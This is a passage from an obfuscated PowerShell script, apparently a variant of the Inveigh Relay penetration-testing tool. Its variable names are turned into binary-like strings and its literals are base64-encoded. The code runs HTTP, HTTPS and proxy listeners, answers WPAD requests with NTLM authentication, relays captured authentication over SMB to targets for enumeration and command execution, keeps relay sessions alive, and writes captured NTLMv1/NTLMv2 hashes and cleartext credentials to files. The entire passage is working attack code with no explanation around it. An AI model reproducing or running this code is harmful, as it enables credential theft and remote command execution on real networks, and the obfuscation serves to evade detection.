                                            for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
                                            {
                                                if(${10001101011100010}.enumerate[${10000101000101100}].IP -eq $target)
                                                {
                                                    ${01100011000100110} = ${10000101000101100}
                                                    break
                                                }
                                            }
                                            ${00001101001110101} = Get-Date
                                        }
                                        if(($attack -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGUA'))) -and ${01001110110000101}.Connected) -and
                                        (!${10001101011100010}.enumerate[${01100011000100110}].Enumerate -or
                                        (New-TimeSpan ${10001101011100010}.enumerate[${01100011000100110}].Enumerate ${00001101001110101}).Minutes -gt $RepeatEnumerate))
                                        {
                                            _00100101000001111 ${01001110110000101} ${_00010000111001010} ${_10110110010000000} ${00110101111010100} $Enumerate $EnumerateGroup
                                        }
                                        if(((${01010001100010110} -and $Attack -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQA='))) -and $Attack -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA='))) -and ${01001110110000101}.Connected) -or
                                        ($Attack -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQA='))) -and $Attack -notcontains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA='))) -and ${01001110110000101}.Connected)) -and
                                        (!${10001101011100010}.enumerate[${01100011000100110}].Execute -or (New-TimeSpan ${10001101011100010}.enumerate[${01100011000100110}].Execute ${00001101001110101}).Minutes -gt $RepeatExecute))
                                        {
                                            _01110111011000100 ${01001110110000101} ${_00100111010100111} ${_00010000111001010} ${_10110110010000000} ${00110101111010100} $false
                                            ${10001101011100010}.enumerate[${01100011000100110}].Execute = $(Get-Date -format s)
                                        }
                                        if(!${01001110110000101}.Connected)
                                        {
                                            ${10001101011100010}.session[${10001101011100010}.session_count] | ? {$_.Status = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAYwBvAG4AbgBlAGMAdABlAGQA')))}
                                        }
                                        ${10001101011100010}.session_count++
                                    }
                                    if($Attack -notcontains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA='))) -and !${10000001100000110} -and $RelayAutoDisable -eq 'Y')
                                    {
                                        if($Attack -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGUA'))))
                                        {
                                            for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
                                            {
                                                if(${10001101011100010}.enumerate[${10000101000101100}].Enumerate)
                                                {
                                                    ${01001101110110010} = @(${10001101011100010}.enumerate[${10000101000101100}].IP)
                                                }
                                            }
                                            if(${10001101011100010}.target_list -and $targets_enumerated)
                                            {
                                                ${00110100110010000} = diff -ReferenceObject ${10001101011100010}.target_list -DifferenceObject ${01001101110110010} -PassThru | ? {$_.SideIndicator -eq "<="}
                                            }
                                        }
                                        if($Attack -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQA='))))
                                        {
                                            for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
                                            {
                                                if(${10001101011100010}.enumerate[${10000101000101100}].Execute)
                                                {
                                                    ${00000010000110010} = @(${10001101011100010}.execute[${10000101000101100}].IP)
                                                }
                                            }
                                            if(${10001101011100010}.target_list -and $targets_enumerated)
                                            {
                                                ${10001000010111000} = diff -ReferenceObject ${10001101011100010}.target_list -DifferenceObject ${00000010000110010} -PassThru | ? {$_.SideIndicator -eq "<="}
                                            }
                                        }
                                        if($Attack -notcontains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA='))) -or (!${00110100110010000} -and $Attack -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGUA'))) -and $Attack -notcontains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQA=')))) -or
                                        (!${10001000010111000} -and $Attack -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQA='))) -and $Attack -notcontains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGUA')))) -or
                                        (!${00110100110010000} -and !${10001000010111000} -and $Attack -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGUA'))) -and $Attack -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQA=')))))
                                        {
                                            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Relay auto disabled due to success") > $null
                                            ${10001101011100010}.SMB_relay = $false
                                        }
                                    }
                                    ${00100010011101111} = 0
                                }
                                else
                                {
                                    ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Relay stopped since ${01001111001000100} has exceeded failed login limit") > $null
                                    ${01001110110000101}.Close()
                                    ${00100010011101111} = 0
                                }
                            }
                            else
                            {
                                ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Relay stopped since ${00101100100001000} appears to be a machine account") > $null
                                ${01001110110000101}.Close()
                                ${00100010011101111} = 0
                            }
                        }
                        else
                        {
                            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] ${01001111001000100} not on relay username list") > $null
                            ${01001110110000101}.Close()
                            ${00100010011101111} = 0
                        }
                    }
                    if(${00010010100101100})
                    {
                        ${10111011111111011} = $false
                    }
                }
            }
            if(!${00010010100101100} -and ${10000101100010011} -and ${01110111101111111} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))) -and (!$ProxyIgnore -or !($ProxyIgnore | ? {${01100010100010010} -match $_})))
            {
                ${10101111110010101} = ${10000101100010011}
                ${10001110010111001} = [System.Text.Encoding]::UTF8.GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAG4AdAAtAFQAeQBwAGUAOgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAvAHgALQBuAHMALQBwAHIAbwB4AHkALQBhAHUAdABvAGMAbwBuAGYAaQBnAA=='))))
            }
            ${01110111111011000} = Get-Date -format r
            ${01110111111011000} = [System.Text.Encoding]::UTF8.GetBytes(${01110111111011000})
            ${10001000011101111} = [System.Text.Encoding]::UTF8.GetBytes(${10101111110010101})
            if(${01110111101111111} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))) -or ($WPADAuth -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAqAA=='))) -and ${01110111101111111} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA')))) -and !${01101111010111001})
            { 
                ${00001110011010001} = [System.Text.Encoding]::UTF8.GetBytes(${10001100110111001})
            }
            ${10110110100000000} = New-Object System.Collections.Specialized.OrderedDictionary
            ${10110110100000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBSAGUAcwBwAG8AbgBzAGUAVgBlAHIAcwBpAG8AbgA='))),[Byte[]](0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20))
            ${10110110100000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBTAHQAYQB0AHUAcwBDAG8AZABlAA=='))),${00011101011101101} + [Byte[]](0x20))
            ${10110110100000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBSAGUAcwBwAG8AbgBzAGUAUABoAHIAYQBzAGUA'))),${10100101101100000} + [Byte[]](0x0d,0x0a))
            if(${01111000101001001})
            {
                ${01011010101000010} = [System.Text.Encoding]::UTF8.GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdABpAG8AbgA6ACAAYwBsAG8AcwBlAA=='))))
                ${10110110100000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBDAG8AbgBuAGUAYwB0AGkAbwBuAA=='))),${01011010101000010} + [Byte[]](0x0d,0x0a))
            }
            ${10110110100000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBTAGUAcgB2AGUAcgA='))),[System.Text.Encoding]::UTF8.GetBytes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAOgAgAE0AaQBjAHIAbwBzAG8AZgB0AC0ASABUAFQAUABBAFAASQAvADIALgAwAA==')))) + [Byte[]](0x0d,0x0a))
            ${10110110100000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBUAGkAbQBlAFMAdABhAG0AcAA='))),[Byte[]](0x44,0x61,0x74,0x65,0x3a,0x20) + ${01110111111011000} + [Byte[]](0x0d,0x0a))
            ${10110110100000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBDAG8AbgB0AGUAbgB0AEwAZQBuAGcAdABoAA=='))),[System.Text.Encoding]::UTF8.GetBytes("Content-Length: $(${10001000011101111}.Length)") + [Byte[]](0x0d,0x0a))
            if(${10111001011010010} -and ${00001110011010001})
            {
                ${10110110100000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBBAHUAdABoAGUAbgB0AGkAYwBhAHQAZQBIAGUAYQBkAGUAcgA='))),${10111001011010010} + ${00001110011010001} + [Byte[]](0x0d,0x0a))
            }
            if(${10001110010111001})
            {
                ${10110110100000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBDAG8AbgB0AGUAbgB0AFQAeQBwAGUA'))),${10001110010111001} + [Byte[]](0x0d,0x0a))
            }
            if(${00001000101000000})
            {
                ${10110110100000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBDAGEAYwBoAGUAQwBvAG4AdAByAG8AbAA='))),${00001000101000000} + [Byte[]](0x0d,0x0a))
            }
            if(${10111011111111011})
            {
                ${10110110100000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABSAGUAcwBwAG8AbgBzAGUAXwBNAGUAcwBzAGEAZwBlAA=='))),[Byte[]](0x0d,0x0a) + ${10001000011101111})
                ${10010010100010000} = _00110101111101011 ${10110110100000000}
                ${10011110101001111}.Write(${10010010100010000},0,${10010010100010000}.Length)
                ${10011110101001111}.Flush()
            }
            sleep -m 10
            ${10110000001010110} = ${01110111101111111}
            if(${01101111010111001})
            {
                if(${00010010100101100})
                {
                    ${10111001001010100}.Client.Close()
                }
                else
                {
                    ${10111001001010100}.Close()
                }
            }
        }
        else
        {
            if(${00110111010101001} -eq ${10111001001010100}.Client.Handle)
            {
                ${01110101101110010}++
            }
            else
            {
                ${01110101101110010} = 0
            }
            if(${01111000101001001} -or ${01110101101110010} -gt 20)
            {
                ${10111001001010100}.Close()
                ${01110101101110010} = 0
            }
            else
            {
                sleep -m 100
            }
        }
    }
    ${10111001001010100}.Close()
    ${00110101011000100}.Stop()
}
${00100001001101110} = 
{
    param ($ConsoleQueueLimit,$RelayAutoExit,$RunTime)
    function _00011111100101000
    {
        while(${10001101011100010}.output_queue.Count -gt 0)
        {
            ${10001101011100010}.console_queue.Add(${10001101011100010}.output_queue[0]) > $null
            if(${10001101011100010}.file_output)
            {
                if (${10001101011100010}.output_queue[0].StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAA=')))) -or ${10001101011100010}.output_queue[0].StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIAA=')))) -or ${10001101011100010}.output_queue[0].StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIAA=')))) -or ${10001101011100010}.output_queue[0].StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAA=')))))
                {
                    ${10001101011100010}.log_file_queue.Add(${10001101011100010}.output_queue[0]) > $null
                }
                else
                {
                    ${10001101011100010}.log_file_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwByAGUAZABhAGMAdABlAGQAXQA=')))) > $null    
                }
            }
            if(${10001101011100010}.log_output)
            {
                ${10001101011100010}.log.Add(${10001101011100010}.output_queue[0]) > $null
            }
            ${10001101011100010}.output_queue.RemoveAt(0)
        }
    }
    function _01111000000110001
    {
        param ([String]${_10001011000101001})
        if(${10001101011100010}.HTTPS -and !${10001101011100010}.HTTPS_existing_certificate -or (${10001101011100010}.HTTPS_existing_certificate -and ${10001101011100010}.HTTPS_force_certificate_delete))
        {
            try
            {
                ${00011010110000000} = New-Object System.Security.Cryptography.X509Certificates.X509Store("My",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAE0AYQBjAGgAaQBuAGUA'))))
                ${00011010110000000}.Open($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABXAHIAaQB0AGUA'))))
                ${01001101011111010} = (ls Cert:\LocalMachine\My | ? {$_.Issuer -Like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0A'))) + ${10001101011100010}.certificate_issuer})
                foreach(${10100101011101001} in ${01001101011111010})
                {
                    ${00011010110000000}.Remove(${10100101011101001})
                }
                ${00011010110000000}.Close()
            }
            catch
            {
                ${10001101011100010}.output_queue.Add("[-] [$(Get-Date -format s)] SSL Certificate Deletion Error [Remove Manually]") > $null
            }
        }
        if($ADIDNSCleanup -eq 'Y' -and ${10001101011100010}.ADIDNS_table.Count -gt 0)
        {
            [Array]${01101110000110110} = ${10001101011100010}.ADIDNS_table.Keys
            foreach(${00000111111111101} in ${01101110000110110})
            {
                if(${10001101011100010}.ADIDNS_table.${00000111111111101} -ge 1)
                {
                    try
                    {
                        _10010111000110100 -_01000100111001111 $ADIDNSCredential -_01011010011110011 $ADIDNSDomain -_00100100001011101 $ADIDNSDomainController -_01110110101001111 ${00000111111111101} -_00100110101010100 $ADIDNSPartition -_00010111101010000 $ADIDNSZone
                        ${10001101011100010}.ADIDNS_table.${00000111111111101} = $null
                    }
                    catch
                    {
                        ${10000111101001011} = $_.Exception.Message
                        ${10000111101001011} = ${10000111101001011} -replace "`n",""
                        ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] ${10000111101001011} $($_.InvocationInfo.Line.Trim())") > $null
                        ${10001101011100010}.output_queue.Add("[-] [$(Get-Date -format s)] ADIDNS host record for ${00000111111111101} remove failed") > $null
                    }
                }
            }
        }
        if(${10001101011100010}.relay_running)
        {
            sleep -m 100
            if(${_10001011000101001})
            {
                ${10001101011100010}.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh Relay is exiting due to ${_10001011000101001}") > $null
            }
            else
            {
                ${10001101011100010}.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh Relay is exiting") > $null  
            }
            if(!${10001101011100010}.running)
            {
                _00011111100101000
                sleep -m 100
            }
            ${10001101011100010}.relay_running = $false
        }
        if(${10001101011100010}.running)
        {
            if(${_10001011000101001})
            {
                ${10001101011100010}.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh is exiting due to ${_10001011000101001}") > $null
            }
            else
            {
                ${10001101011100010}.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh is exiting") > $null  
            }
            _00011111100101000
            if(!$elevated_privilege)
            {
                sleep -s 3
            }
            ${10001101011100010}.running = $false
        }
        ${10001101011100010}.ADIDNS = $null
        ${10001101011100010}.HTTPS = $false
    }
    if($RunTime)
    {    
        ${00000111110001111} = New-TimeSpan -Minutes $RunTime
        ${01110010000010000} = [System.Diagnostics.Stopwatch]::StartNew()
    }
    while(${10001101011100010}.relay_running -and !${10001101011100010}.running)
    {
        if($RelayAutoExit -eq 'Y' -and !${10001101011100010}.SMB_relay)
        {
            sleep -S 5
            _01111000000110001 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAYQBiAGwAZQBkACAAcgBlAGwAYQB5AA==')))
        }
        if($RunTime)
        {
            if(${01110010000010000}.Elapsed -ge ${00000111110001111})
            {
                _01111000000110001 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBlAGEAYwBoAGkAbgBnACAAcgB1AG4AIAB0AGkAbQBlAA==')))
            }
        }
        if(${10001101011100010}.file_output -and -not ${10001101011100010}.control)
        {
            while(${10001101011100010}.log_file_queue.Count -gt 0)
            {
                ${10001101011100010}.log_file_queue[0]|Out-File ${10001101011100010}.log_out_file -Append
                ${10001101011100010}.log_file_queue.RemoveAt(0)
            }
            while(${10001101011100010}.NTLMv1_file_queue.Count -gt 0)
            {
                ${10001101011100010}.NTLMv1_file_queue[0]|Out-File ${10001101011100010}.NTLMv1_out_file -Append
                ${10001101011100010}.NTLMv1_file_queue.RemoveAt(0)
            }
            while(${10001101011100010}.NTLMv2_file_queue.Count -gt 0)
            {
                ${10001101011100010}.NTLMv2_file_queue[0]|Out-File ${10001101011100010}.NTLMv2_out_file -Append
                ${10001101011100010}.NTLMv2_file_queue.RemoveAt(0)
            }
            while(${10001101011100010}.cleartext_file_queue.Count -gt 0)
            {
                ${10001101011100010}.cleartext_file_queue[0]|Out-File ${10001101011100010}.cleartext_out_file -Append
                ${10001101011100010}.cleartext_file_queue.RemoveAt(0)
            }
            while(${10001101011100010}.form_input_file_queue.Count -gt 0)
            {
                ${10001101011100010}.form_input_file_queue[0]|Out-File ${10001101011100010}.form_input_out_file -Append
                ${10001101011100010}.form_input_file_queue.RemoveAt(0)
            }
        }
        if(!${10001101011100010}.console_output -and $ConsoleQueueLimit -ge 0)
        {
            while(${10001101011100010}.console_queue.Count -gt $ConsoleQueueLimit -and !${10001101011100010}.console_output)
            {
                ${10001101011100010}.console_queue.RemoveAt(0)
            }
        }
        if(!${10001101011100010}.status_output -and !${10001101011100010}.running)
        {
            _00011111100101000
        }
        sleep -m 5
        if(${10001101011100010}.stop)
        {
            ${10001101011100010}.console_queue.Clear()
            _01111000000110001
        }
    }
 }
${00000000001010100} = 
{
    param ($SessionRefresh)
    ${00110101111010100} = _01110110101010101
    while(${10001101011100010}.relay_running)
    {
        if(${10001101011100010}.session_socket_table.Count -gt 0)
        {
            $session = 0
            while($session -lt ${10001101011100010}.session_socket_table.Count)
            {
                ${10010111001000100} =  New-TimeSpan ${10001101011100010}.session[$session]."Last Activity" $(Get-Date)
                if(${10001101011100010}.session_socket_table[$session].Connected -and ${10001101011100010}.session_lock_table[$session] -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAbgA='))) -and ${10010111001000100}.Minutes -ge $SessionRefresh)
                {
                    ${10001101011100010}.session_lock_table[$session] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBlAGQA')))
                    ${_10010010110001100} = ${10001101011100010}.session_socket_table[$session]
                    ${00001111100000001} = ${_10010010110001100}.GetStream()
                    ${_10110110010000000} = ${10001101011100010}.session_table[$session]
                    ${10011111011010000} =  ${10001101011100010}.session_message_ID_table[$session]
                    ${01011110000111110} = 0x00,0x00,0x00,0x00
                    ${10111110001011100} = New-Object System.Byte[] 1024
                    ${00101100011010111} = "\\" + ${10001101011100010}.session_socket_table[$session].Client.RemoteEndpoint.Address.IPaddressToString + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAFAAQwAkAA==')))
                    ${00110100011000011} = [System.Text.Encoding]::Unicode.GetBytes(${00101100011010111})
                    ${10011111011010000}++
                    ${00110000000111010} = _01101011100000110 0x03,0x00 0x01,0x00 $false ${10011111011010000} ${00110101111010100} ${01011110000111110} ${_10110110010000000}
                    ${00010110001011100} = _01111011001111111 ${00110100011000011}
                    ${01111101100001011} = _00110101111101011 ${00110000000111010}
                    ${10010110001100010} = _00110101111101011 ${00010110001011100}    
                    ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${10010110001100010}.Length
                    ${00101101010001101} = _00110101111101011 ${10001001101011001}
                    ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010}
                    try
                    {
                        ${00001111100000001}.Write(${00101010111110011},0,${00101010111110011}.Length) > $null
                        ${00001111100000001}.Flush()
                        ${00001111100000001}.Read(${10111110001011100},0,${10111110001011100}.Length) > $null
                    }
                    catch
                    {
                        ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Relay session $session has closed") > $null
                        ${10001101011100010}.session[$session] | ? {$_.Status = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAYwBvAG4AbgBlAGMAdABlAGQA')))}
                    }
                    if(${10001101011100010}.session_socket_table[$session].Connected)
                    {
                        ${01011110000111110} = ${10111110001011100}[40..43]
                        sleep -s 1
                        ${10011111011010000}++
                        ${00110000000111010} = _01101011100000110 0x04,0x00 0x01,0x00 $false ${10011111011010000} ${00110101111010100} ${01011110000111110} ${_10110110010000000}
                        ${00010110001011100} = _01001101010010100
                        ${01111101100001011} = _00110101111101011 ${00110000000111010}
                        ${10010110001100010} = _00110101111101011 ${00010110001011100}
                        ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${10010110001100010}.Length
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010}
                        try
                        {
                            ${00001111100000001}.Write(${00101010111110011},0,${00101010111110011}.Length) > $null
                            ${00001111100000001}.Flush()
                            ${00001111100000001}.Read(${10111110001011100},0,${10111110001011100}.Length) > $null
                        }
                        catch
                        {
                            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Relay session $session has closed") > $null
                            ${10001101011100010}.session[$session] | ? {$_.Status = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAYwBvAG4AbgBlAGMAdABlAGQA')))}
                        }
                    }
                    ${10001101011100010}.session_lock_table[$Session] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAbgA=')))
                    ${10001101011100010}.session[$Session] | ? {$_."Last Activity" = Get-Date -format s}
                    ${10001101011100010}.session_message_ID_table[$Session] = ${10011111011010000}
                }
                $session++
                sleep -s 1
            }
        }
        sleep -s 1
    }
}
function _01011110100000101
{
    ${01011001100001001} = [RunspaceFactory]::CreateRunspace()
    ${10100011111011100} = $false
    ${00010010100101100} = $false
    ${01011001100001001}.Open()
    ${01011001100001001}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${10001101011100010})
    ${00000010100110111} = [PowerShell]::Create()
    ${00000010100110111}.Runspace = ${01011001100001001}
    ${00000010100110111}.AddScript(${00001111001001001}) > $null
    ${00000010100110111}.AddScript(${00101111010111000}) > $null
    ${00000010100110111}.AddScript(${10111010001100000}) > $null
    ${00000010100110111}.AddScript(${10000100010000111}).AddArgument($Attack).AddArgument($Challenge).AddArgument(
        $Command).AddArgument($Enumerate).AddArgument($EnumerateGroup).AddArgument($FailedLoginThreshold).AddArgument(
        $HTTPIP).AddArgument($HTTPPort).AddArgument(
        ${10100011111011100}).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument(${00010010100101100}).AddArgument(
        $RelayAutoDisable).AddArgument($RepeatEnumerate).AddArgument($RepeatExecute).AddArgument(
        $Service).AddArgument(${_00100111010100111}).AddArgument($SessionLimitPriv).AddArgument(
        $SessionLimitUnpriv).AddArgument($SessionLimitShare).AddArgument($SessionPriority).AddArgument(
        $Target).AddArgument($TargetMode).AddArgument($TargetRefresh).AddArgument($Username).AddArgument(
        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument(${10000101100010011}) > $null
    ${00000010100110111}.BeginInvoke() > $null
}
function _00010111101100001
{
    ${00111000000101101} = [RunspaceFactory]::CreateRunspace()
    ${10100011111011100} = $true
    ${00010010100101100} = $false
    ${00111000000101101}.Open()
    ${00111000000101101}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${10001101011100010})
    ${01011100010100110} = [PowerShell]::Create()
    ${01011100010100110}.Runspace = ${00111000000101101}
    ${01011100010100110}.AddScript(${00001111001001001}) > $null
    ${01011100010100110}.AddScript(${00101111010111000}) > $null
    ${01011100010100110}.AddScript(${10111010001100000}) > $null
    ${01011100010100110}.AddScript(${10000100010000111}).AddArgument($Attack).AddArgument($Challenge).AddArgument(
        $Command).AddArgument($Enumerate).AddArgument($EnumerateGroup).AddArgument($FailedLoginThreshold).AddArgument(
        $HTTPIP).AddArgument($HTTPSPort).AddArgument(
        ${10100011111011100}).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument(${00010010100101100}).AddArgument(
        $RelayAutoDisable).AddArgument($RepeatEnumerate).AddArgument($RepeatExecute).AddArgument(
        $Service).AddArgument(${_00100111010100111}).AddArgument($SessionLimitPriv).AddArgument(
        $SessionLimitUnpriv).AddArgument($SessionLimitShare).AddArgument($SessionPriority).AddArgument(
        $Target).AddArgument($Username).AddArgument($WPADAuth).AddArgument($WPADAuthIgnore).AddArgument(
        ${10000101100010011}) > $null
    ${01011100010100110}.BeginInvoke() > $null
}
function _10101000100011101
{
    ${01001100000110011} = [RunspaceFactory]::CreateRunspace()
    ${10100011111011100} = $false
    ${00010010100101100} = $true
    ${01001100000110011}.Open()
    ${01001100000110011}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${10001101011100010})
    ${01101010100010000} = [PowerShell]::Create()
    ${01101010100010000}.Runspace = ${01001100000110011}
    ${01101010100010000}.AddScript(${00001111001001001}) > $null
    ${01101010100010000}.AddScript(${00101111010111000}) > $null
    ${01101010100010000}.AddScript(${10111010001100000}) > $null
    ${01101010100010000}.AddScript(${10000100010000111}).AddArgument($Attack).AddArgument($Challenge).AddArgument(
        $Command).AddArgument($Enumerate).AddArgument($EnumerateGroup).AddArgument($FailedLoginThreshold).AddArgument(
        $ProxyIP).AddArgument($ProxyPort).AddArgument(
        ${10100011111011100}).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument(${00010010100101100}).AddArgument(
        $RelayAutoDisable).AddArgument($RepeatEnumerate).AddArgument($RepeatExecute).AddArgument(
        $Service).AddArgument(${_00100111010100111}).AddArgument($SessionLimitPriv).AddArgument(
        $SessionLimitUnpriv).AddArgument($SessionLimitShare).AddArgument($SessionPriority).AddArgument(
        $Target).AddArgument($Username).AddArgument($WPADAuth).AddArgument($WPADAuthIgnore).AddArgument(
        ${10000101100010011}) > $null
    ${01101010100010000}.BeginInvoke() > $null
}
function _01000111110000001
{
    ${00000110001001100} = [RunspaceFactory]::CreateRunspace()
    ${00000110001001100}.Open()
    ${00000110001001100}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${10001101011100010})
    ${00110111001101101} = [PowerShell]::Create()
    ${00110111001101101}.Runspace = ${00000110001001100}
    ${00110111001101101}.AddScript(${00001111001001001}) > $null
    ${00110111001101101}.AddScript(${01001011001001101}) > $null
    ${00110111001101101}.AddScript(${00101111010111000}) > $null
    ${00110111001101101}.AddScript(${10111010001100000}) > $null
    ${00110111001101101}.AddScript(${00100001001101110}).AddArgument($ConsoleQueueLimit).AddArgument(
        $RelayAutoExit).AddArgument($RunTime) > $null
    ${00110111001101101}.BeginInvoke() > $null
}
function _10101010110010111
{
    ${00010110110000100} = [RunspaceFactory]::CreateRunspace()
    ${00010110110000100}.Open()
    ${00010110110000100}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${10001101011100010})
    ${00101100010110111} = [PowerShell]::Create()
    ${00101100010110111}.Runspace = ${00010110110000100}
    ${00101100010110111}.AddScript(${00001111001001001}) > $null
    ${00101100010110111}.AddScript(${00101111010111000}) > $null
    ${00101100010110111}.AddScript(${10111010001100000}) > $null
    ${00101100010110111}.AddScript(${00000000001010100}).AddArgument($SessionRefresh) > $null
    ${00101100010110111}.BeginInvoke() > $null
}
if($HTTP -eq 'Y')
{
    _01011110100000101
    sleep -m 50
}
if($HTTPS -eq 'Y')
{
    _00010111101100001
    sleep -m 50
}
if($Proxy -eq 'Y')
{
    _10101000100011101
    sleep -m 50
}
_01000111110000001
if($SessionRefresh -gt 0)
{
    _10101010110010111
}
try
{
    if($ConsoleOutput -ne 'N')
    {
        if($ConsoleStatus)
        {    
            ${10010010110010010} = New-TimeSpan -Minutes $ConsoleStatus
            ${00001011001000001} = [System.Diagnostics.Stopwatch]::StartNew()
        }
